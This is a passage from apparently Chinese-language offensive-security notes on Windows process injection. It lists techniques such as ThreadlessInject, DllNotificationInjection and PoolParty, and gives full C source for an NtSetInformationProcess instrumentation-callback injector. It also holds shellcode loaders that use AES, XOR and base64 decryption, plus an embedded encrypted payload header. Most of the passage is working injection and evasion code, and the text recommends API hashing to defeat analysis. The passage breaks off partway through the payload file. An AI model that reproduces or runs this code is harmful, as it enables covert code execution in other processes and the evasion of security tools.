2.\u5728\u8fdc\u7a0b\u7ebf\u7a0b\u679a\u4e3e\u51fa\u7528\u6237\u5c42Kernel32.dll\u7684\u51fd\u6570\u7684\u57fa\u5740\uff08\u8fd9\u91cc\u4f7f\u7528\u7684\u662fCreateFileW\uff09 3.\u66f4\u6539\u5185\u5b58\u7a7a\u95f4\u4e3aRWX 4.\u5f80\u51fd\u6570\u57fa\u5740\u4e2d\u5199\u5165shellcode 5.\u66f4\u6539\u5185\u5b58\u7a7a\u95f4\u4e3aRCX TheardlessInjection https://github.com/CCob/ThreadlessInject hook\u8fdc\u7a0b\u8fdb\u7a0b\u4e2d\u7684\u6307\u5b9a\u51fd\u6570\uff0c\u5f53\u8fdb\u7a0b\u6267\u884c\u6307\u5b9a\u51fd\u6570\u7684\u65f6\u6267\u884c\u4ee3\u7801 Entry Point Injection https://github.com/Kudaes/EPI \u4fee\u6539\u76ee\u6807\u8fdb\u7a0b\u7684PEB\u4fe1\u606f\uff0cPEB\u4e2d\u5b58\u50a8\u4e86dllmain\u4fe1\u606f\uff0c\u66f4\u6539dllmain\u7684\u5730\u5740\u4e3ashellcode\u3002\u5f53\u76ee\u6807\u8fdb\u7a0b\u542f\u52a8\u6216\u7ed3\u675f\u4e00\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u91cd\u65b0\u8c03\u7528dllmain\uff0c\u6b64\u65f6\u4f1a\u6267\u884cshellcode MockingJay \u5229\u7528\u767dDLL\u6587\u4ef6\u7684RWX\u7a7a\u95f4\u6ce8\u5165 \u8be6\u89c10MFIle-dll\u9879\u76ee DllNotificationInjection(2023/8) https://learn.microsoft.com/en-us/windows/win32/devnotes/ldrregisterdllnotification https://github.com/ShorSec/DllNotificationInjection https://shorsec.io/blog/dll-notification-injection/ \u5728\u8fdc\u7a0b\u8fdb\u7a0b\u4e2d\u4fee\u6539 PLDR_DLL_NOTIFICATION_ENTRY \u6210\u5458\uff0c\u5e76\u4f7f Cookie \u6307\u5411shellcode\u7684\u5730\u5740\u3002\u5f53\u8fdc\u7a0b\u8fdb\u7a0b\u52a0\u8f7ddll\u4e4b\u524d\u4f1a\u89e6\u53d1\u4e00\u4e2a\u901a\u77e5 LdrRegisterDllNotification \uff0c\u4ece\u800c\u89e6\u53d1shellcode NtSetInformationProcess(2023-10) https://github.com/OtterHacker/SetProcessInjection \u8be5\u65b9\u5f0f\u4f7f\u7528Nirvana\u8c03\u8bd5\u6280\u672f\uff0c\u5728\u8fdc\u7a0b\u8fdb\u7a0b\u8bbe\u7f6e\u4e86\u4e00\u4e2ahook\uff0c\u5728hook\u8bbe\u7f6e\u6076\u610f\u4ee3\u7801\u3002\u5f53\u7cfb\u7edf\u6bcf\u6b21\u6267\u884csyscall\u540e\u4f1a\u7acb\u5373\u8c03\u7528hook\u3002 \u8fd9\u79cd\u65b9\u5f0f\u9700\u8981 SE_DEBUG_PRIVILEGE \u6743\u9650\u3002 \u7531\u4e8e\u9700\u8981\u9ad8\u6743\u9650\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u9002\u5408\u4f5c\u4e3a\u521d\u59cb\u8bbf\u95ee\u4f7f\u7528\u3002 #include \"helpers.h\" #include <TlHelp32.h> #include \"sc.h\" //\u5b9a\u4e49\u5404\u79cd #define DEBUG(x, ...) printf(x, ##__VA_ARGS__) #define ProcessInstrumentationCallback 40 #define SE_DEBUG_PRIVILEGE 0x100000 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0) extern VOID InstrumentationHook(VOID); //\u5b9a\u4e49SetInformationProcess\u7ed3\u6784\u4f53 typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION { ULONG Version; ULONG Reserved; PVOID Callback; } PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION; typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)( DWORD Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, DWORD* OldStatus ); typedef NTSTATUS(NTAPI* pNtSetInformationProcess)( _In_ HANDLE hProcess, _In_ PROCESS_INFORMATION_CLASS ProcessInformationClass, _In_reads_bytes_(ProcessInformationSize) LPVOID ProcessInformation, _In_ DWORD ProcessInformationSize ); //\u6839\u636e\u8fdb\u7a0b\u540d\u83b7\u53d6\u8fdb\u7a0b\u53e5\u67c4\uff0c\u8fd9\u91cc\u662f\u8981\u6ce8\u5165\u7684\u8fdb\u7a0b HANDLE getProcHandlebyName(LPSTR procName, DWORD* PID) { PROCESSENTRY32 entry; entry.dwSize = sizeof(PROCESSENTRY32); NTSTATUS status = NULL; HANDLE hProc = 0; HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (!snapshot) { DEBUG(\"[x] Cannot retrieve the processes snapshot\\n\"); return NULL; } if (Process32First(snapshot, &entry)) { do { if (strcmp((entry.szExeFile), procName) == 0) { *PID = entry.th32ProcessID; DEBUG(\"[+] Injecting into : %d\\n\", *PID); hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID); if (!hProc) { continue; } return hProc; } } while (Process32Next(snapshot, &entry)); } return NULL; } int main(void) { ULONG imageSize = 0; HMODULE hNtdll = GetModuleHandle(\"ntdll.dll\", &imageSize); //\u76f4\u63a5\u4f7f\u7528GetModuleHandle()\u83b7\u53d6ntdll\u53e5\u67c4\uff0c\u53ef\u4ee5\u8fdb\u4e00\u6b65\u4f18\u5316 if (!hNtdll) { DEBUG(\"[x] Cannot load NTDLL.DLL\\n\"); return; } DWORD PID = 0; HANDLE hProc = getProcHandlebyName(\"notepad.exe\", &PID); //\u6839\u636e\u8fdb\u7a0b\u540d\u83b7\u53d6\u8fdb\u7a0b\u53e5\u67c4 if (!hProc) { DEBUG(\"[x] Cannot open the process\\n\"); return; } //\u4e00\u7cfb\u5217\u64cd\u4f5c\uff0c\u627e\u5230NtSetInformationProcess\u548cRtlAdjustPrivilege\u5730\u5740 DEBUG(\"[+] Starting hook deployment !\\n\"); PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo; pNtSetInformationProcess NtSetInformationProcess = GetProcAddress(hNtdll, \"NtSetInformationProcess\"); pRtlAdjustPrivilege RtlAdjustPrivilege = GetProcAddress(hNtdll, \"RtlAdjustPrivilege\"); //\u8fd9\u4e2a\u51fd\u6570\u662f\u901a\u8fc7sc.h\u6765\u83b7\u53d6shellcode buildsc(); size_t szOutput = 0; DWORD size = 0; unsigned char* file_enc = NULL; BYTE* beaconContent = NULL; size_t beaconSize = NULL; file_enc = base64_decode(sc, sc_length, &szOutput); //\u5148\u5bf9shellcode base64\u89e3\u7801 for (int i = 0; i < sc_length; i++) { printf(\"0x%x,\", file_enc[i]); } printf(\"\\n\"); if (szOutput == 0) { DEBUG(\"[x] Base64 decode failed \\n\"); return -1; } //\u4f7f\u7528key\u6765AES\u89e3\u5bc6 beaconSize = szOutput - 16; beaconContent = (unsigned char*)calloc(beaconSize, sizeof(BYTE)); BOOL decryptStatus = aes_decrypt(key, (sizeof(key) / sizeof(key[0])) - 1, file_enc, beaconSize, beaconContent); if (!decryptStatus || beaconContent == NULL) { DEBUG(\"[x] AES decryption failed\\n\"); return -1; } for (int i = 0; i < beaconSize; i++) { printf(\"0x%x,\", beaconContent[i]); } printf(\"\\n\"); //\u5728\u76ee\u6807\u8fdb\u7a0b\u5206\u914d\u5185\u5b58\u7a7a\u95f4 LPVOID beaconAddress = VirtualAllocEx(hProc, NULL, beaconSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (!beaconAddress) { DEBUG(\"[x] Cannot allocate beacon space : %d\\n\", GetLastError()); return; } DEBUG(\"[+] Beacon memory at : %p\\n\", beaconAddress); //\u81ea\u5b9a\u4e49\u6c47\u7f16\uff0c\u4f7fhook\u4e0d\u8981\u65e0\u9650\u5faa\u73af SIZE_T shellcodeSize = 49; BYTE shellcodeTemplate[49] = { 0x55, 0x48, 0x89, 0xe5, 0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00, 0x50, 0x53, 0x51, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x59, 0x5b, 0x58, 0x5d, 0x41, 0xff, 0xe2 }; //push rbp //mov rbp, rsp //; This will modify the instruction push RBP into JMPR10 //mov qword ptr[rip \u2013 15] 0xE2FF41 //push rax //push rbx //push rcx //push r9 //push rl0 //push rll //movabs rax, ${ CSAddr } //call rax //pop r11 //pop r10 //pop r9 //pop rcx //pop rbx //pop rax //pop rbp //jmp r10 BYTE shellcodeContent[49]; CopyMemory(shellcodeContent, shellcodeTemplate, shellcodeSize * sizeof(BYTE)); CopyMemory(shellcodeContent + 26, &beaconAddress, sizeof(DWORD64)); //\u4e3a\u6c47\u7f16\u7801\u5206\u914d\u5185\u5b58\u7a7a\u95f4 LPVOID shellcodeAddress = VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (!shellcodeAddress) { DEBUG(\"[x] Cannot allocate shellcode space : %d\\n\", GetLastError()); return; } DEBUG(\"[+] Shellcode memory at : %p\\n\", shellcodeAddress); //shellcode\u5199\u5165\u5185\u5b58 BOOL status = WriteProcessMemory(hProc, beaconAddress, beaconContent, beaconSize, NULL); if (!status) { DEBUG(\"[x] Cannot write beacon content at %p : %d\\n\", beaconAddress, GetLastError()); return; } DEBUG(\"[+] Beacon content written at %p\\n\", beaconAddress); //\u6c47\u7f16\u7801\u5199\u5165\u5185\u5b58 status = WriteProcessMemory(hProc, shellcodeAddress, shellcodeContent, shellcodeSize, NULL); if (!status) { DEBUG(\"[x] Cannot write shellcode content at %p : %d\\n\", shellcodeAddress, GetLastError()); return; } DEBUG(\"[+] Shellcode content written at %p\\n\", shellcodeAddress); //\u4fee\u6539\u5185\u5b58\u5c5e\u6027 DWORD oldProtect = 0; status = VirtualProtectEx(hProc, beaconAddress, beaconSize, PAGE_EXECUTE_READ, &oldProtect); if (!status) { DEBUG(\"[x] Failed to reprotect beacon memory at %p : %d\\n\", beaconAddress, GetLastError()); } DEBUG(\"[+] Beacon memory reprotected !\\n\"); status = VirtualProtectEx(hProc, shellcodeAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect); if (!status) { DEBUG(\"[x] Failed to reprotect beacon memory at %p : %d\\n\", shellcodeAddress, GetLastError()); } DEBUG(\"[+] Beacon shellcode reprotected !\\n\"); //\u8bbe\u7f6ehook InstrumentationCallbackInfo.Version = 0; InstrumentationCallbackInfo.Reserved = 0; InstrumentationCallbackInfo.Callback = shellcodeAddress; NTSTATUS ntStatus = NtSetInformationProcess( hProc, ProcessInstrumentationCallback, &InstrumentationCallbackInfo, sizeof(InstrumentationCallbackInfo) ); if (!NT_SUCCESS(ntStatus)) { DEBUG(\"[x] Failed to deploy hook : %p \\n\", ntStatus); return; } DEBUG(\"[+] Hook deployed successfully !\\n\"); BOOL hookCalled; do { DEBUG(\"[-] Waiting 5 seconds for the hook to be called...\\n\"); Sleep(5000); BYTE content[1]; SIZE_T bytesRead; status = ReadProcessMemory(hProc, shellcodeAddress, &content, 1 * sizeof(BYTE), &bytesRead); if (!status) { DEBUG(\"\\t[x] Cannot read process memory : %d\\n\", GetLastError()); return; } DEBUG(\"\\t[-] Value read: %2x\\n\", content[0]); hookCalled = content == shellcodeContent[0]; } while (hookCalled); DEBUG(\"[+] Your payload must be executed now !\\n\"); } \u7b80\u5355\u5206\u6790 \u867d\u7136\u7a0b\u5e8f\u5b9e\u73b0\u4e86\u81ea\u5b9a\u4e49AES\u52a0\u5bc6\uff0c\u4f46\u662f\u5728\u52a8\u6001\u8c03\u8bd5\u4e2d\u4f9d\u65e7\u5f88\u5bb9\u6613\u88ab\u6293\u5230\u539f\u59cbshellcode\u3002 \u5bfc\u5165\u51fd\u6570\u90fd\u662f\u6b63\u5e38\u8c03\u7528\u7684\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728\u5bfc\u5165\u8868\u4e2d\u4e00\u76ee\u4e86\u7136\u3002 \u76f4\u63a5\u67e5\u627e WriteProcessMemory \u7684\u51fd\u6570\u5f15\u7528\u6253\u4e0b\u65ad\u70b9\u3002 windows\u4e0a64\u4f4d\u7684\u7a0b\u5e8f\u8c03\u7528\u7ea6\u5b9a\u662ffastcall\uff0c\u5728\u5c06\u8981\u4f20\u5165 WriteProcessMemory \u51fd\u6570\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u548c\u7b2c\u56db\u4e2a\u53c2\u6570r8\u548cr9\u53ef\u4ee5\u627e\u5230shellcode\u7684\u5185\u5b58\u5730\u5740\u548c\u5927\u5c0f\u3002 WriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_reads_bytes_(nSize) LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T* lpNumberOfBytesWritten ); 0000026B71178E20 FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30 8B \u00fc\u00e8....`.\u00e51\u00c0d.P0. 0000026B71178E30 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 31 FF AC 3C R..R..r(.\u00b7J&1\u00ff\u00ac< 0000026B71178E40 61 7C 02 2C 20 C1 CF 0D 01 C7 E2 F2 52 57 8B 52 a|., \u00c1\u00cf..\u00c7\u00e2\u00f2RW.R 0000026B71178E50 10 8B 4A 3C 8B 4C 11 78 E3 48 01 D1 51 8B 59 20 ..J<.L.x\u00e3H.\u00d1Q.Y 0000026B71178E60 01 D3 8B 49 18 E3 3A 49 8B 34 8B 01 D6 31 FF AC .\u00d3.I.\u00e3:I.4..\u00d61\u00ff\u00ac 0000026B71178E70 C1 CF 0D 01 C7 38 E0 75 F6 03 7D F8 3B 7D 24 75 \u00c1\u00cf..\u00c78\u00e0u\u00f6.}\u00f8;}$u 0000026B71178E80 E4 58 8B 58 24 01 D3 66 8B 0C 4B 8B 58 1C 01 D3 \u00e4X.X$.\u00d3f..K.X..\u00d3 0000026B71178E90 8B 04 8B 01 D0 89 44 24 24 5B 5B 61 59 5A 51 FF ....\u00d0.D$$[[aYZQ\u00ff 0000026B71178EA0 E0 5F 5F 5A 8B 12 EB 8D 5D 6A 01 8D 85 B2 00 00 \u00e0__Z..\u00eb.]j...\u00b2.. 0000026B71178EB0 00 50 68 31 8B 6F 87 FF D5 BB F0 B5 A2 56 68 A6 .Ph1.o.\u00ff\u00d5\u00bb\u00f0\u00b5\u00a2Vh\u00a6 0000026B71178EC0 95 BD 9D FF D5 3C 06 7C 0A 80 FB E0 75 05 BB 47 .\u00bd.\u00ff\u00d5<.|..\u00fb\u00e0u.\u00bbG 0000026B71178ED0 13 72 6F 6A 00 53 FF D5 63 61 6C 63 2E 65 78 65 .roj.S\u00ff\u00d5calc.exe 0000026B71178EE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ \u8fd9\u548c\u672a\u52a0\u5bc6\u524d\u7684shellcode\u662f\u4e00\u6837\u7684 \u6240\u4ee5\u60f3\u8981\u9632\u6b62\u88ab\u5206\u6790\uff0c\u8fd8\u9700\u8981\u7ed3\u5408\u5176\u4ed6\u6280\u672f\u5982apihash\u4f7f\u7528\u3002\u867d\u7136\u4e0d\u80fd\u5b8c\u5168\u963b\u6b62\u88ab\u5206\u6790\uff0c\u4f46\u80fd\u5927\u5927\u589e\u5927\u5206\u6790\u96be\u5ea6\u3002 PoolParty(2023-12) https://github.com/SafeBreach-Labs/PoolParty \u8be5\u6ce8\u5165\u6280\u672f\u89e3\u51b3\u4e86 CreateRemoteThread() \u7684\u95ee\u9898\u3002 \u8be5\u6280\u672f\u5229\u7528 \u7528\u6237\u6a21\u5f0f \u4e0bWindows\u7ebf\u7a0b\u6c60\u53ef\u4fe1\u7a0b\u5e8f\u6765\u89e3\u51b3\u6b64\u95ee\u9898\u3002 \u7ebf\u7a0b\u6c60\u5305\u62ec - \u5de5\u4f5c\u7ebf\u7a0b - \u7b49\u5f85\u7ebf\u7a0b - \u5de5\u4f5c\u961f\u5217 - \u5de5\u4f5c\u5668\u5de5\u5382 - \u9ed8\u8ba4\u7ebf\u7a0b\u6c60 1\u3001\u5229\u7528\u5de5\u4f5c\u5668\u5de5\u5382 \u5de5\u4f5c\u5668\u5de5\u5382\u662f\u4e00\u4e2aWindows\u5bf9\u8c61\uff0c\u8d1f\u8d23\u7ba1\u7406\u7ebf\u7a0b\u6c60\u5de5\u4f5c\u7ebf\u7a0b\u3002\u5b83\u901a\u8fc7\u76d1\u89c6\u6d3b\u52a8\u6216\u963b\u585e\u6765\u7ba1\u7406\u5de5\u4f5c\u7ebf\u7a0b\uff0c\u5e76\u6839\u636e\u76d1\u89c6\u7ed3\u679c\u521b\u5efa\u6216\u7ec8\u6b62\u5de5\u4f5c\u7ebf\u7a0b\u3002 \u5de5\u4f5c\u5668\u5de5\u5382\u4e0d\u6267\u884c\u4efb\u4f55\u5de5\u4f5c\u9879\u7684\u8c03\u5ea6\u6216\u6267\u884c\uff1b \u5b83\u7684\u4f5c\u7528\u662f\u786e\u4fdd\u5de5\u4f5c\u7ebf\u7a0b\u7684\u6570\u91cf\u8db3\u591f\u3002 \u8986\u76d6\u73b0\u6709\u5de5\u4f5c\u5668\u5de5\u5382\u7684routine 2\u3001\u5229\u7528\u7ebf\u7a0b\u6c60 \u5411TP_WORK\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_IO\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_WAIT\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_ALPC\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_JOB\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_DIRECT\u63d2\u5165\u4efb\u52a1\u961f\u5217 \u5411TP_TIMER\u63d2\u5165\u4efb\u52a1\u961f\u5217 Shellcode\u52a0\u89e3\u5bc6 \u5b89\u88c5openssl\u5e93 https://slproweb.com/products/Win32OpenSSL.html \u4ea6\u6216 \u52a0\u5bc6 #define KEY 0x01 //\u8fdb\u884c\u4ea6\u6216\u7684\u5b57\u7b26 unsigned char buf[] = \"\\xff\"; int main(int argc, char* argv[]) { unsigned char c[sizeof(buf)]; //\u83b7\u53d6shellcode\u957f\u5ea6 for (int i = 0; i < sizeof(buf) - 1; i++) { c[i] = buf[i] ^ KEY;//\u8fdb\u884c\u89e3\u5bc6 printf(\"\\\\x%x\", c[i]); } printf(\"\\n\"); return 0; } \u89e3\u5bc6 #define KEY 0x01 //\u4ea6\u6216\u5b57\u7b26 unsigned char buff[] = \"\\xfd\"; //\u52a0\u5bc6\u540e\u7684\u6570\u636e unsigned char rawData[sizeof(buff)]; //\u83b7\u53d6shellcode\u957f\u5ea6 for (int i = 0; i < sizeof(buff) - 1; i++) { rawData[i] = buff[i] ^ KEY;//\u8fdb\u884c\u89e3\u5bc6 } \u81ea\u5b9a\u4e49RC4 \u53c2\u8003\u300a0APCLdr-\u5355\u6587\u4ef6\u300b\u9879\u76ee\uff0cBuilder\u4e3a\u52a0\u5bc6\uff0cdecrypt\u4e3a\u89e3\u5bc6\uff0c\u89e3\u5bc6\u4ece\u8d44\u6e90\u8868\u4e2d\u52a0\u8f7d AES \u4f9d\u8d56\u4e09\u65b9\u5e93\uff0c\u8c03\u7528\u65f6\u9700\u8981\u628a\u9759\u6001\u5e93\u653e\u7a0b\u5e8f\u4e0b\u9762\u3002 #include <cstdio> #include <openssl/aes.h> #include <corecrt_malloc.h> #pragma comment(lib, \"libcrypto.lib\") #define KEY \"abcdefghijklmnop\" // AES \u5bc6\u94a5\uff0c\u957f\u5ea6\u4e3a 128 \u4f4d (16 \u5b57\u8282) void aesEncrypt(const unsigned char* key, const unsigned char* input, int inputLength, unsigned char* output) { AES_KEY aesKey; AES_set_encrypt_key(key, 128, &aesKey); AES_encrypt(input, output, &aesKey); } int main() { const char* inputFileName = \"payload.bin\"; // \u8f93\u5165\u4e8c\u8fdb\u5236\u6587\u4ef6\u540d const char* outputFileName = \"output.bin\"; // \u8f93\u51fa\u4e8c\u8fdb\u5236\u6587\u4ef6\u540d FILE* inputFile; if (fopen_s(&inputFile, inputFileName, \"rb\") != 0) { printf(\"Failed to open input file.\\n\"); return 1; } // \u83b7\u53d6\u8f93\u5165\u6587\u4ef6\u5927\u5c0f fseek(inputFile, 0, SEEK_END); long inputFileSize = ftell(inputFile); fseek(inputFile, 0, SEEK_SET); // \u5206\u914d\u5185\u5b58\u7528\u4e8e\u5b58\u50a8\u8f93\u5165\u6587\u4ef6\u6570\u636e unsigned char* buf = (unsigned char*)malloc(inputFileSize); if (!buf) { printf(\"Failed to allocate memory.\\n\"); fclose(inputFile); return 1; } // \u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\u6570\u636e\u5230 buf \u6570\u7ec4 fread(buf, 1, inputFileSize, inputFile); fclose(inputFile); // \u5173\u95ed\u8f93\u5165\u6587\u4ef6 // \u5bf9\u6570\u636e\u8fdb\u884c AES \u52a0\u5bc6 unsigned char* encrypted = (unsigned char*)malloc(inputFileSize); aesEncrypt((const unsigned char*)KEY, buf, inputFileSize, encrypted); // \u521b\u5efa\u5e76\u6253\u5f00\u8f93\u51fa\u6587\u4ef6 FILE* outputFile; if (fopen_s(&outputFile, outputFileName, \"wb\") != 0) { printf(\"Failed to create output file.\\n\"); free(buf); free(encrypted); return 1; } // \u5c06\u52a0\u5bc6\u540e\u7684\u6570\u636e\u5199\u5165\u8f93\u51fa\u6587\u4ef6 fwrite(encrypted, 1, inputFileSize, outputFile); fclose(outputFile); // \u5173\u95ed\u8f93\u51fa\u6587\u4ef6 printf(\"Encryption completed.\\n\"); free(buf); free(encrypted); return 0; } \u81ea\u5b9a\u4e49AES 3\u4e2a\u5934\u6587\u4ef6\uff0c2\u4e2ac\u6587\u4ef6\u3002\u4f7f\u7528python\u811a\u672c\u52a0\u5bc6 \u8be6\u89c1\u300aSetProcessInjection\u300b\u9879\u76ee aes.h \u52a0\u5bc6\u7b97\u6cd5\u5934\u6587\u4ef6 #pragma once #ifndef _AES_H_ #define _AES_H_ #include <stdint.h> #include <stddef.h> // #define the macros below to 1/0 to enable/disable the mode of operation. // // CBC enables AES encryption in CBC-mode of operation. // CTR enables encryption in counter-mode. // ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously. // The #ifndef-guard allows it to be configured before #include'ing or at compile time. #ifndef CBC #define CBC 1 #endif #ifndef ECB #define ECB 1 #endif #ifndef CTR #define CTR 1 #endif //define AES128 1 //#define AES192 1 #define AES256 1 #define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only #if defined(AES256) && (AES256 == 1) #define AES_KEYLEN 32 #define AES_keyExpSize 240 #elif defined(AES192) && (AES192 == 1) #define AES_KEYLEN 24 #define AES_keyExpSize 208 #else #define AES_KEYLEN 16 // Key length in bytes #define AES_keyExpSize 176 #endif struct AES_ctx { uint8_t RoundKey[AES_keyExpSize]; #if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1)) uint8_t Iv[AES_BLOCKLEN]; #endif }; void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key); #if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1)) void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv); void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv); #endif #if defined(ECB) && (ECB == 1) // buffer size is exactly AES_BLOCKLEN bytes; // you need only AES_init_ctx as IV is not used in ECB // NB: ECB is considered insecure for most uses void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf); void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf); #endif // #if defined(ECB) && (ECB == !) #if defined(CBC) && (CBC == 1) // buffer size MUST be mutile of AES_BLOCKLEN; // Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme // NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv() // no IV should ever be reused with the same key void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length); void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length); #endif // #if defined(CBC) && (CBC == 1) #if defined(CTR) && (CTR == 1) // Same function for encrypting as for decrypting. // IV is incremented for every block, and used after encryption as XOR-compliment for output // Suggesting https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme // NOTES: you need to set IV in ctx with AES_init_ctx_iv() or AES_ctx_set_iv() // no IV should ever be reused with the same key void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length); #endif // #if defined(CTR) && (CTR == 1) #endif // _AES_H_ helpers.h \u52a0\u5bc6\u7b97\u6cd5\u5934\u6587\u4ef6 #pragma once #include <windows.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <tchar.h> #include \"aes.h\" #define DEBUG(x, ...) printf(x, ##__VA_ARGS__) static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/' }; static char* decoding_table = NULL; static int mod_table[] = { 0, 2, 1 }; static int x64 = 1; extern int AES_KEY_LENGTH; void build_decoding_table(); unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length); BOOL aes_decrypt(const uint8_t* key, size_t szKey, unsigned char* encrypted, size_t szEncrypted, unsigned char* unencryptedData); unsigned char* xor_text(const char* buff); wchar_t* char2wc(const char* buff); sc.h \u8fd9\u91cc\u5b58\u50a8\u52a0\u5bc6\u540e\u7684shellcode\uff0c\u4f7f\u7528python\u6587\u4ef6\u751f\u6210 #define _CRT_SECURE_NO_WARNINGS #pragma once #include <string.h> const char sc_0[16] = {0x50,0x2b,0x32,0x37,0x52,0x73,0x6e,0x63,0x79,0x4c,0x79,0x53,0x31,0x44,0x59,0x45}; char sc_1[16] = {0x46,0x4b,0x4b,0x5a,0x36,0x54,0x51,0x6b,0x4f,0x7a,0x43,0x4c,0x62,0x52,0x31,0x32}; const char sc_2[16] = {0x66,0x44,0x62,0x4d,0x66,0x38,0x47,0x68,0x69,0x39,0x4f,0x34,0x58,0x48,0x67,0x33}; char sc_3[16] = {0x54,0x31,0x32,0x39,0x48,0x54,0x44,0x34,0x4a,0x50,0x50,0x50,0x34,0x5a,0x56,0x33}; const char sc_4[16] = {0x68,0x64,0x57,0x54,0x48,0x79,0x34,0x74,0x43,0x4b,0x41,0x42,0x6d,0x4d,0x32,0x51}; char sc_5[16] = {0x2f,0x45,0x59,0x44,0x66,0x76,0x56,0x36,0x79,0x35,0x49,0x32,0x68,0x4b,0x5a,0x6f}; const char sc_6[16] = {0x35,0x45,0x70,0x58,0x35,0x34,0x38,0x31,0x67,0x54,0x4a,0x75,0x64,0x36,0x75,0x62}; char sc_7[16] = {0x4f,0x36,0x72,0x52,0x59,0x5a,0x70,0x68,0x56,0x50,0x43,0x37,0x57,0x41,0x67,0x61}; const char sc_8[16] = {0x75,0x4e,0x73,0x6e,0x6d,0x56,0x76,0x44,0x7a,0x6f,0x62,0x69,0x36,0x79,0x4b,0x43}; char sc_9[16] = {0x49,0x72,0x2f,0x34,0x6a,0x4a,0x38,0x70,0x38,0x67,0x36,0x43,0x36,0x4e,0x54,0x62}; const char sc_10[16] = {0x70,0x71,0x34,0x4f,0x37,0x6a,0x4c,0x77,0x48,0x76,0x4e,0x76,0x6e,0x57,0x61,0x65}; char sc_11[16] = {0x77,0x39,0x4e,0x48,0x5a,0x39,0x66,0x5a,0x6f,0x33,0x58,0x4e,0x4d,0x4e,0x6f,0x32}; const char sc_12[16] = {0x77,0x38,0x73,0x47,0x64,0x55,0x62,0x6f,0x64,0x31,0x2f,0x44,0x69,0x6b,0x51,0x37}; char sc_13[16] = {0x38,0x44,0x6b,0x4f,0x57,0x4b,0x54,0x55,0x54,0x65,0x69,0x46,0x73,0x51,0x52,0x74}; const char sc_14[16] = {0x52,0x64,0x63,0x47,0x5a,0x63,0x51,0x36,0x5a,0x30,0x72,0x47,0x4b,0x48,0x6f,0x2f}; char sc_15[16] = {0x32,0x61,0x4c,0x54,0x55,0x69,0x55,0x55,0x61,0x51,0x5a,0x43,0x6b,0x6f,0x78,0x50}; const char sc_16[16] = {0x4f,0x34,0x76,0x57,0x72,0x67,0x69,0x6f,0x6a,0x53,0x79,0x76,0x46,0x64,0x68,0x69}; char sc_17[16] = {0x7a,0x75,0x32,0x2b,0x35,0x56,0x41,0x7a,0x34,0x67,0x5a,0x58,0x75,0x7a,0x32,0x6a}; const char sc_18[16] = {0x62,0x4d,0x54,0x32,0x54,0x52,0x2f,0x75,0x4a,0x4c,0x77,0x3d}; char sc[300]; int sc_length = 300; void buildsc_0(){ memcpy(&sc[0], sc_0, 16); memcpy(&sc[16], sc_1, 16); memcpy(&sc[32], sc_2, 16); memcpy(&sc[48], sc_3, 16); memcpy(&sc[64], sc_4, 16); memcpy(&sc[80], sc_5, 16); memcpy(&sc[96], sc_6, 16); memcpy(&sc[112], sc_7, 16); memcpy(&sc[128], sc_8, 16); 